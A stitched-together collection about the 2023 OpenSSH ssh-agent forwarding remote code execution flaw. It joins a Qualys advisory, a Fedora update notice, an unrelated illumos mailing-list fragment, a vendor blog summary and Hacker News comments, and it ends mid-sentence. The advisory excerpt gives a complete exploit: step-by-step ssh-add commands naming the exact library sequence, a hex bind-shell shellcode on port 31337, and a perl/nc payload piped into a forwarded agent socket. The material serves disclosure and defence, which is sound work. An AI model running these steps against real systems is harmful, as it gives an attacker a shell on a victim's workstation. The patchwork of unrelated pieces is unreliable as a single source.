server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]
------------------------------------------------------------------------
3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:
server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/\*] succeeded!
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:
workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307

Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================
In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.
------------------------------------------------------------------------
1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso),
without connecting this workstation to the Internet.
------------------------------------------------------------------------
1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:
workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb https://old-releases.ubuntu.com/ubuntu/ impish main restricted universe' > /etc/apt/sources.list
------------------------------------------------------------------------
1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:
workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg
------------------------------------------------------------------------
2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)
workstation$ eval `ssh-agent -s`
Agent pid 912
workstation$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-GnpGKph6xbe3/agent.911
workstation$ ssh -A server
server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
server$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-30N8pjTKWn/agent.996
------------------------------------------------------------------------
3/ Then, as a remote attacker who has access to this server:
------------------------------------------------------------------------
3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:
server# echo /tmp/ssh-\*/agent.\*
/tmp/ssh-30N8pjTKWn/agent.996
server# export SSH\_AUTH\_SOCK=/tmp/ssh-30N8pjTKWn/agent.996
server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation
------------------------------------------------------------------------
3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:
server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH\_AUTH\_SOCK"
[Press Ctrl-C after a few seconds.]
------------------------------------------------------------------------
3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:
server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation
------------------------------------------------------------------------
3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libgnatcoll\_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86\_64-linux-gnu/libgnatcoll\_postgres.so.1": agent refused operation
------------------------------------------------------------------------
3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:
server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex\_data.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libxkbregistry.so.0.0.0
------------------------------------------------------------------------
3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:
server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]
------------------------------------------------------------------------
3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:
server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/\*] succeeded!
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)
workstation$ ps axuf

------------------------------------------------------------------------
To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:
workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...

Continuing.

Callback function use-after-free
========================================================================
While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:
- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
but not unloaded (munmap()ed) by dlclose(), because it is marked as
"nodelete" by the loader;
- a shared library (for example, libgnunetutil.so or gammaray\_probe.so)
is loaded and registers a userland callback function with the core
library (via gcry\_set\_allocation\_handler() or qtHookData[], for
example), but it does not deregister this callback function when
dlclose()d (i.e., when its code is munmap()ed);
- another shared library is loaded (mmap()ed) and replaces the unmapped
callback function's code with another piece of code (a useful gadget);
- yet another shared library is loaded and calls one of the core
library's functions, which in turn calls the unmapped callback
function and therefore executes the replacement code (the useful
gadget) instead, thus jumping to the stack.
------------------------------------------------------------------------
In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-\*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.
In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps

thread that sleeps for 10 seconds in kernel-land:

thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Sigaltstack use-after-free
========================================================================
From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:
------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------
On investigation, we discovered that at least one shared library
(libgnatcoll\_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA\_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS\_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:
- we randomly load zero or more shared libraries that permanently alter
the mmap layout;
- we load libgnatcoll\_postgres.so, which registers an alternate signal
stack and then munmap()s it without deregistering it;
- we randomly load zero or more shared libraries that alter the mmap
layout (again), and hopefully replace the unmapped signal stack with
another writable memory mapping (for example, a thread stack, or a
.data or .bss segment);
- we randomly load one shared library that registers an SA\_ONSTACK
signal handler but does not munmap() its code when dlclose()d (unlike
our original "Signal handler use-after-free" attack);
- we randomly load one shared library that raises this signal and
therefore calls the SA\_ONSTACK signal handler, thus overwriting the
replacement memory mapping with stack frames from the signal handler;
- we randomly load one or more shared libraries that hopefully use the
overwritten contents of the replacement memory mapping.
Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.
========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================
Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.
Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:
- a shared library raises a signal (a SIGSEGV in the example below, at
line 134110) and, in consequence of a "Signal handler use-after-free",
a replacement gadget of the form "ret N" is executed instead of the
signal handler (at line 134111);
- exactly as the real signal handler would, the replacement gadget
returns to the glibc's restore\_rt() function (at line 134112), which
in turn calls the kernel's rt\_sigreturn() function (at line 134113);
- however, before the kernel's rt\_sigreturn() function is called, the
replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
and as a result, the kernel's rt\_sigreturn() function restores all
userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).
Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt\_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.
========================================================================
\_Unwind\_Context type-confusion
========================================================================
This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:
- some shared libraries load LLVM's libunwind.so as a "nodelete" library
(i.e., it is never unloaded, even after dlclose());
- some shared libraries throw a C++ exception, which loads GCC's
libgcc\_s.so and calls the \_Unwind\_GetCFA() function (at line 57295 in
the example below);
- however, GCC's libgcc\_s.so mistakenly calls LLVM's \_Unwind\_GetCFA()
(at line 57298) instead of GCC's \_Unwind\_GetCFA() (because LLVM's
libunwind.so was loaded first), and passes a pointer to GCC's struct
\_Unwind\_Context to this function (instead of a pointer to LLVM's
struct \_Unwind\_Context, which is a different type of structure);
- LLVM's \_Unwind\_GetCFA() then calls its unw\_get\_reg() function (at line
57303), which in turn calls a function pointer (at line 57311) that is
a member of LLVM's struct \_Unwind\_Context, but that happens to be a
stack pointer in GCC's struct \_Unwind\_Context;

========================================================================
RCE in library constructor
========================================================================
As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.
The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:
https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt
This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.
========================================================================
Discussion
========================================================================
We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:
- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
versions, distributions, or operating systems might be hiding further
surprises;
- our rudimentary fuzzer can certainly be greatly improved, and has
definitely not tried all the combinations of shared libraries and side
effects;
- we have identified seven attack vectors against ssh-agent (described
in the "Results" section), but we have not analyzed in detail all the
results of our fuzzer;
- we have not fully explored various aspects of these attack vectors:
- it might be possible to reliably exploit the "Sigaltstack
use-after-free" (by carefully overwriting the .data or .bss segment
of a shared library) or the "Sigreturn to arbitrary instruction
pointer" (by partially overwriting a leftover pointer in
ssh-pkcs11-helper's stack);
- we currently store our shellcode in ssh-pkcs11-helper's main() stack
buffer only, but it might be possible to store shellcode in other
stack buffers as well, or somehow spray the stack with shellcode,
which would dramatically increase our chances of jumping into our
shellcode;
for example, we tried to spray the stack with shellcode by
interrupting a memcpy() of controlled data with a signal handler,
thereby spilling controlled YMM registers to the stack (inspired by
https://bugs.chromium.org/p/project-zero/issues/detail?id=2266), but
we failed because we can memcpy() only ~10KB of data, and because we
cannot remotely use tricks such as inotify or sched\*() to precisely
time this race;
- it might be possible to control the mmap layout of ssh-pkcs11-helper
with page precision (which would allow us to precisely control the
gadget that replaces the unmapped signal handler, callback function,
or return from syscall), but we failed to find large malloc()ations
(which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
influence the mmap layout is to load and unload shared libraries, as
mentioned in Step 4a/ of the "Experiments" section);
- instead of replacing the unmapped signal handler or callback
function (or return from syscall) with a gadget from another shared
library, it is perfectly possible to replace it with an executable
thread stack (made executable by loading an "execstack" library),
but we have failed so far to control the contents of such a thread
stack.

Fedora Update Notification
FEDORA-2023-79a18e1725
2023-07-28 01:39:45.299954
--------------------------------------------------------------------------------

Name : openssh
Product : Fedora 37
Version : 8.8p1
Release : 11.fc37
URL : <http://www.openssh.com/portable.html>
Summary : An open source implementation of SSH protocol version 2
Description :
SSH (Secure SHell) is a program for logging into and executing
commands on a remote machine. SSH is intended to replace rlogin and
rsh, and to provide secure encrypted communications between two
untrusted hosts over an insecure network. X11 connections and
arbitrary TCP/IP ports can also be forwarded over the secure channel.

OpenSSH is OpenBSD's version of the last free version of SSH, bringing
it up to date in terms of security and features.

This package includes the core files necessary for both the OpenSSH
client and server. To make this package useful, you should also
install openssh-clients, openssh-server, or both.

I see this one goes from December 2022 to present:

<https://github.com/omniosorg/omnios-build/blob/r151044/doc/ReleaseNotes.md>

and this one from May 2022 to April 2023:

<https://github.com/omniosorg/omnios-build/blob/r151042/doc/ReleaseNotes.md>

So that's already more than a year, and I don't need to look further.

Also, I note this reply by Bob Friesenhahn:

So I think we can accept OmniOS as new distros list member, if that's
desired and Dan would represent OmniOS on the list.  This subscription
on its own would not allow sharing of info with other illumos distros.

In special cases, Dan would be able to ask the issue reporters their
explicit permission to share with other illumos distros.

If those distros do typically need the info, they may request direct
list membership.

How does this sound to you, Dan?

The Qualys Threat Research Unit (TRU) has discovered a remote code execution vulnerability in OpenSSHâs forwarded ssh-agent. This vulnerability allows a remote attacker to potentially execute arbitrary commands on vulnerable OpenSSHâs forwarded ssh-agent. Given the widespread use of OpenSSHâs forwarded ssh-agent Qualys Research Unit recommends that security teams apply patches for this vulnerability on priority.

## **About OpenSSHâs Agent Forwarding**

The ssh-agent is a background program that caches private keys for SSH public key authentication, reducing the need for regular passphrase input. Initiated at the start of an X or login session, it operates by storing keys in memory and unloading only when the process ends.

Itâs instrumental in automation scripts or tasks requiring frequent server connections, as it prevents the need for insecure password storage or constant passphrase input. The connections to ssh-agent may be forwarded from further remote to avoid the need for authentication data to be stored on other machines. Nonetheless, itâs still crucial to secure the keys with robust passphrases.

## **Potential Impact of OpenSSHâs Agent Forwarding**

Successful exploitation of this vulnerability allows a remote attacker to execute arbitrary commands on vulnerable OpenSSH forwarded ssh-agent. Â Qualys security researchers have been able to independently verify the vulnerability, develop a PoC exploit on installations of Ubuntu Desktop 22.04 and 21.10. Other Linux distributions are likely vulnerable and probably exploitable.

As soon as the Qualys research team confirmed the vulnerability, Qualys engaged in responsible vulnerability disclosure and coordinated with the vendor, OpenSSH, on this occasion to announce the vulnerability.

## Disclosure Timeline

2023-07-06: Draft advisory and initial patch sent to OpenSSH.

2023-07-07: OpenSSH sent refined patches.

2023-07-09: Feedback on patches sent to OpenSSH.

2023-07-11: Received final patches from OpenSSH; feedback sent.

2023-07-14: OpenSSH plans for security-only release on July 19th.

2023-07-19: Coordinated release.

## **Technical Details**

## **Qualys QID Coverage**

Qualys has recently released a single QID 38904, which is available starting from the vulnsigs version VULNSIGS-2.5.820-3.

| QID | Title | Qualys Release Versions |
| --- | --- | --- |
| 38904 | OpenSSH Remote Code Execution (RCE) Vulnerability in its forwarded ssh-agent | VULNSIGS-2.5.820-3 |

## **Conclusion**

This newly uncovered ssh-agent vulnerability underlines the continuous need for rigorous security measures and immediate response. Even robust systems can harbor hidden vulnerabilities, as demonstrated by the shortcomings of the ssh-agent. Proactively rectifying such vulnerabilities through actions such as implementing patches is critical to maintaining the integrity of digital assets.

It's well established that if Alice forwards an SSH agent to Bob, Bob can use the SSH agent protocol to make Alice open DLLs, because there's an agent protocol command (SSH\_AGENTC\_ADD\_SMARTCARD\_KEY) that OpenSSH implements with dlopen: when you ask the agent to access a smart card, OpenSSH dlopen()'s the library corresponding to the `id` of the device. This is a Jann Horn bug from 2016, and OpenSSH fixed it by whitelisting DLLs to /usr/lib and directories like it. The Qualys bug builds on Horn's bug. When OpenSSH dlopen()'s the library, it then tries to look up a PKCS#11 entry point function, and, when it doesn't find it, it dlclose()'s the library and returns an error. The issue is that most of the libraries in system library paths were never intended to be opened maliciously, and so they do all sorts of stuff in their constructors and destructors (any function marked `\_\_attribute\_\_((constructor))` or `destructor` is called by dlopen and dlclose respectively). In particular, they register callbacks and signal handlers. Most of these libraries are never expected to dlclose at all, so they tend not to be great about cleaning up. Better still, if you randomly load oddball libraries into random programs, some of them crash, generating SIGBUS and SIGSEGV. So you've got a classic UAF situation here: (1) force Alice to load a library that registers a SIGBUS handler; it won't be a PKCS#11 handler so it'll get immediately dlclose()'d, but won't clean up the handler. (2) Load another library, which will take over the program text address the signal handler points to. (3) Finally, load a library that SIGBUS's. If you manage to get a controlled jump swapped into place in step (2), you win. If you're thinking "it's pretty unlikely you're going to be able to line up a controlled jump at exactly the address previously registered as a signal handler", you're right, but there's another quirk of dlclose() they take advantage of: there's an ELF flag, NODELETE, that instructs the linker not to unmap a library when it's unloaded, and a bunch of standard libraries set it, so you can use those libraries to groom the address space. Finally, because some runtimes require executable stacks, there are standard libraries with an ELF flag that instructs the process to make the stack executable. If you load one of these libraries, and you have a controlled jump, you can write shellcode into the stack like it's 1998. To figure out the right sequence of steps, they basically recapitulated the original ROP gadget research idea: they swept all the standard Ubuntu libraries with a fuzzer to find combinations of loads that produced controlled jumps (ie, that died trying to execute stack addresses). A working exploit loads a pattern of "smartcards" that looks like this (all in /usr/lib): ```     syslinux/modules/efi64/gfxboot.c32 (execstack)     pulse-15.0+dfsg1/modules/module-remap-sink.so (groom)     x86_64-linux-gnu/libgnatcoll_postgres.so.1 (SIGBUS handler)     pulse-15.0+dfsg1/modules/module-http-protocol-unix.so (groom)     x86_64-linux-gnu/sane/libsane-hp.so.1.0.32 (groom)     libreoffice/program/libindex_data.so (groom)     x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so (groom)     libreoffice/program/libscriptframe.so (groom)     x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so (groom)     x86_64-linux-gnu/libxkbregistry.so.0.0.0 (groom)     debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug (SIGBUS)  ``` The paper goes on to classify like 4 more patterns whereby you can get unexpected control transfers by dlopen() and immediately dlclosing() libraries. The kicker: ```     we noticed that one shared library's constructor function     (which can be invoked by a remote attacker via an ssh-agent forwarding)     starts a server thread that listens on a TCP port, and we discovered a     remotely exploitable vulnerability (a heap-based buffer overflow) in     this server's implementation. ``` | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [jeffbee](user?id=jeffbee) [on July 20, 2023](item?id=36796888)   | [parent](#36792299) | [next](#36796539) [â]  This is pretty wild, but if anyone had asked me previously "should the SSH agent be allowed to dlopen anything?" I would have said "no". It really seems like for something this sensitive, running it in an empty namespace with no abilities of any kind, unless or until those abilities prove necessary, would be a good approach for those who have high security requirements. If I know I am going to use a smartcard, then I can make the PKCS library visible inside the agent's sandbox. But I can see no reason why I would have given it access to libsane, or whatever libenca is, or any other library for that matter. | | --- | --- | --- | | | |  |  | [fsckboy](user?id=fsckboy) [on July 20, 2023](item?id=36796927)   | [root](#36792299) | [parent](#36796888) | [next](#36796539) [â]  and i quote: Enca is an Extremely Naive Charset Analyser.

It strikes me that the most compatible way might be to double down on the wackiness and try to perform the required feature detection in some more indirect way like parsing the named lib with readelf(1) or the platform equivalent. The sensible thing would be to force users to register available provider shared libraries in an ssh-agent config file, but that feels like a pretty big breaking change. Edit: Didnât realize a patch was already available. I see that they did in fact fix this with a breaking change, by simply disabling the functionality by default, and recommending that users allowlist their specific libraries: ```   Potentially-incompatible changes   --------------------------------       * ssh-agent(8): the agent will now refuse requests to load PKCS#11      modules issued by remote clients by default.

The PKCS#11 library is loaded by a long lived helper process, not ssh-agent itself. ```   > (Note to the curious readers: for security reasons, and as explained in   > the "Background" section below, ssh-agent does not actually load such a   > shared library in its own address space (where private keys are stored),   > but in a separate, dedicated process, ssh-pkcs11-helper.)   ``` That didnât help because the long lived nature of the helper process exposed it to the shared lib side effects such that they could be chained into a gadget. If I understand correctly, the long life is important for interacting with many smart cards and HSMs because of *their* APIs. If you are suggesting that there should be an IPC API for this process and vendors ship a full program that speaks it, that seems reasonable at a glance, but not really something the OpenSSH project can dictate. | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on July 20, 2023](item?id=36802790)   | [root](#36792299) | [parent](#36801030) | [next](#36797877) [â]  Indeed, my suggestion is zero dynamic libraries in security critical code/applications. If security is a goal, loading in-process foreign code is already a lost battle. Plugins as dynamic libraries made sense when we were fighting for each MB, not when people have hardware where they go to the extreme of running containers for every application they can think of. Bonus, processes aren't as heavy as containers. | | --- | --- | --- | | | |  |  | [eptcyka](user?id=eptcyka) [on July 20, 2023](item?id=36797877)   | [root](#36792299) | [parent](#36797733) | [prev](#36801030) | [next](#36796580) [â]  Would IPC help if a remote attacker was still allowed to execute arbitrary plugins? | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on July 20, 2023](item?id=36798125)   | [root](#36792299) | [parent](#36797877) | [next](#36796580) [â]  It would help against attacks that depend on corrupting process address space, like this one. Additionally, one could use OS security features to reduce API surface for each plugin, depending on what they are actually supposed to be doing, e.g. no need for file system access if they only do in-memory data processing. As for "would it help in 100% of the attacks?", no. Even if there were no plugins support, there is still the possibility to exploit logical errors anyway.

However, the main application of NODELETE is the DF\_1\_NODELETE flag in the shared object itself. A typical use case is if the shared object installs a function pointer somewhere where it cannot be reverted as part of the dlclose operation. If the dlclose proceeds despite this, calling the function later will have hard-to-diagnose, unpredictable consequences. Rather than relying on dlclose never being called (which is difficult because the object might have been loaded as an indirect dependency, unaware to the caller of dlopen), using the DF\_1\_NODELETE flag makes this explicit. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [on July 20, 2023](item?id=36800929)   | [root](#36792299) | [parent](#36798205) | [prev](#36798542) | [next](#36806206) [â]  It's not really possible to safely unmap code in a library in the presence of various other useful features you might like to use, specifically thread-local storage, atfork, callbacks (and probably threads in general).

To be clear, the "remote" part of the code execution is that an attacker controlling your destination server can cause your *client* to run an attacker-controlled payload, *if* the client is forwarding their credentials (`ssh -A`). Most people don't tend to make connections to arbitrary SSH hosts, and certainly they don't do it while forwarding their credentials along.

This is devastating, because it's not just that you control the destination server and steal the keys, but you can take over the user's entire workstation. Once you've got the user's entire workstation, you potentially have access to everything else they have, from their email, to other SSH hosts, to key loggers, to Git repos. This is about as bad as it gets, and all because someone is using Agent Forwarding. Best of all, the victim has *no idea* that they've been completely compromised. They can live inside your machine for years, upgrade their sploits, and generally exfiltrate all of your secrets. Never use agent forwarding. Just don't.

If you forward your agent that means a remote host has full access to everything in your agent! Never forward your agent ever! No buts!" With the '-c' flag, if a remote host tries to use my agent, I get a graphical dialog on my local machine asking me if I want to let my agent do it. If I'm not expecting the dialog, I can just say no, and now I know the remote is compromised. Actually, I go a step further. Because it is possible to accidentally accept a signing request by pressing the enter key that I meant to press for sth else, I make my agent require a passphrase on every use, not just a yes/no dialog. In checking my machines for this CVE, I discovered my agent has yet another layer of security built-in. I use gpg-agent, relying on its famed security posture. Turns out, when forwarded, gpg-agent supports nothing except signing. It does not support adding keys from a remote, let alone fancy operations like loading a PKCS11 provider chosen by a remote. ---- Securing a forwarded agent has nothing to do with whether there are openly exposed services on a remote system. The remote system could have malicious code that entered it not necessarily through an exposed service. A compromised npm package in the supply chain, for instance, is sufficient. It doesn't matter how it got there. What matters is: when it does, can it abuse a forwarded agent.

Edit: After thinking about it more, I think I may have misunderstood how the -c parameter would perform in regards to this CVE. Would a confirmation prompt actually suffice to prevent this attack? Also, it begs the question, does this exploit rely upon someone *already* forwarding to a malicious server? I've only read the CVE, and skimmed the reporter's blog, so I don't know with certainty one way or the other. If the exploit does require that the forwarding has already taken place, -c couldn't really help, right? The decision was made to allow it.

It is a mitigation to a malicious remote silently opening further ssh connections to other servers you have access to. My parent claimed that using agent forwarding is always insecure. Judging by their response to my comments elsewhere in this discussion, they seem to be under the impression that a forwarded agent will always silently and automatically sign auth requests. And yes, if you forward an agent with a key in it that's missing the '-c' flag, it will. Ignorance of the confirmation feature is classifiable under 'you don't know what you're doing'. The same parent has also been beating their drum of 'create keypairs on remote servers' pretty heavily in many places in this discussion. That \_is\_ less secure than a forwarded agent that confirms each use. ---- I do not claim anywhere that the '-c' flag prevents this CVE from being exploited. It's just that the agent I happened to be using â gpg-agent instead of ssh-agent â just happened to be immune to this CVE by doing what OpenSSH has decided to do in response to this CVE. I.e., I blindly relied on gpg-agent to be secure and it paid off here. ---- > ... the forwarding has already taken place, -c couldn't really help, right? The decision was made to allow it. It's not a confirmation of "Do you want to forward this agent?". It's a confirmation of "Do you want to sign a request using this key?". That happens in every auth request. So if you ssh into foo, you'd get a dialog to confirm the use of your private key for this initial ssh. This is not added security, just an extra step in the initial ssh process. But if you try to ssh into bar from foo, then you'd get another dialog on your local machine to confirm the use of your private key for the auth request by bar. \_This\_ is the added security vs. malicious code on foo ssh-ing into bar as you without your knowledge. | | --- | --- | --- | | | |  |  | [e12e](user?id=e12e) [on July 20, 2023](item?id=36799093)   | [root](#36791441) | [parent](#36794497) | [prev](#36794702) | [next](#36799993) [â]  > Never use agent forwarding.

Which means they'll voluntarily break the security of the system without care (and, of course, without understanding). You also forget that: 1. Agents can be scoped too. 2. Jumpboxes are often used to jump to a large number (most often, all) of servers. No organization is going around creating point-to-point jump links between servers or dedicating a separate jumpbox for every destination server. 3.

Used *and* implemented many times. Sometimes this could be a problem, but IME most plugin architectures I've seen don't rely on static constructors or destructors for implicit registration/deregistration of callbacks. Among other reasons, it's a landmine of multi-threading issues and glibc itself has historically had many bugs related to this, albeit mostly a consequence of glibc implementing (until recently) libpthread separate from libc. Also, POSIX does not guarantee that dlclose does anything: "An application writer may use dlclose() to make a statement of intent on the part of the process, but this statement does not create any requirement upon the implementation." > Who cares about memory leaks, right? I can't find the blog post now, but IIRC Solaris made getenv thread-safe by never deallocating any memory allocated for the environ array or its contents. The blog post had a curious and memorable defense which explained how the memory usage was asymptotically bounded, similar to how hash table operations are described as asymptotically O(1) in time. And Solaris cares very much about memory management--unlike Linux or FreeBSD it implements strict memory accounting, so no OOM killer non-sense. Is it ideal? No. But these are legitimate decisions taken in light of lots of experience, and if you want to write truly robust applications one has to pay attention to standards, implementation details, and best practices. IME best practice wrt module systems on Unix and the open source world generally has always been to avoid implicit registration/deregistration of callbacks. I believe the same is true in the Windows world, though I've never written much software for Windows. (Anyone know if FreeLibrary immediately invokes static destructors?) FWIW, I have implemented hacks which relied on static constructors and where hot reloading was more problematic in the absence of static destructors. For example, I once implemented a proof of concept for automatic runtime reloading of SSL certificates and keys in the Splunk server by writing a library interposer (supporting FreeBSD, Linux, macOS, and Solaris) that installed global OpenSSL SSL\_CTX callbacks. So I know why these things could be useful. But that example was a PoC hack. And even in situations where 